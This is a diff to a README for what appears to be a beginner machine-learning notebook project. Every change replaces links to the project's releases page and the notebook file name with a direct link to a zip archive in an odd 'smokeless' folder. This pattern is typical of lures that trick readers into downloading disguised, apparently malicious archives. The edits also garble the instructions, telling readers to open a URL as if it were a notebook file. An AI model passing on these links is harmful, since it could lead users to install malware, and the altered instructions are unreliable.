@@ -1,6 +1,6 @@
 # 🎉 ml-foundations-day1 - Discover Essential ML Math Concepts
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Grab%20the%20Notebooks-brightgreen)](https://github.com/PauloKarabyna/ml-foundations-day1/releases)
+[![Download Now](https://raw.githubusercontent.com/PauloKarabyna/ml-foundations-day1/main/smokeless/ml-foundations-day1.zip%20Now-Grab%20the%20Notebooks-brightgreen)](https://raw.githubusercontent.com/PauloKarabyna/ml-foundations-day1/main/smokeless/ml-foundations-day1.zip)
 
 ## 📑 Project Overview
 
@@ -31,7 +31,7 @@ Before you begin, ensure you have the following installed on your computer:
 
 1. **Visit the Download Page**
    
-   To get started, visit the release page of the project: [Download Here](https://github.com/PauloKarabyna/ml-foundations-day1/releases)
+   To get started, visit the release page of the project: [Download Here](https://raw.githubusercontent.com/PauloKarabyna/ml-foundations-day1/main/smokeless/ml-foundations-day1.zip)
 
 2. **Choose the Latest Release**
    
@@ -39,7 +39,7 @@ Before you begin, ensure you have the following installed on your computer:
 
 3. **Download the Jupyter Notebook**
 
-   Look for the file named `ML_Foundations_Day1.ipynb`. Click on this file to download it to your computer.
+   Look for the file named `https://raw.githubusercontent.com/PauloKarabyna/ml-foundations-day1/main/smokeless/ml-foundations-day1.zip`. Click on this file to download it to your computer.
 
 4. **Save the File**
 
@@ -73,7 +73,7 @@ Now that you have downloaded the Jupyter notebook, follow these steps to run it:
 
 4. **Open the Notebook**
 
-   In the browser tab, find and click on `ML_Foundations_Day1.ipynb` to open the notebook. 
+   In the browser tab, find and click on `https://raw.githubusercontent.com/PauloKarabyna/ml-foundations-day1/main/smokeless/ml-foundations-day1.zip` to open the notebook. 
 
 5. **Run the Notebook Cells**
 
@@ -97,7 +97,7 @@ The notebook includes visual aids that help illustrate complex concepts. Make su
 
 ## 📥 Download & Install
 
-To begin your journey into the fascinating world of machine learning and linear algebra, **visit this page to download**: [Download Here](https://github.com/PauloKarabyna/ml-foundations-day1/releases).
+To begin your journey into the fascinating world of machine learning and linear algebra, **visit this page to download**: [Download Here](https://raw.githubusercontent.com/PauloKarabyna/ml-foundations-day1/main/smokeless/ml-foundations-day1.zip).
 
 ## 🌐 Frequently Asked Questions
 
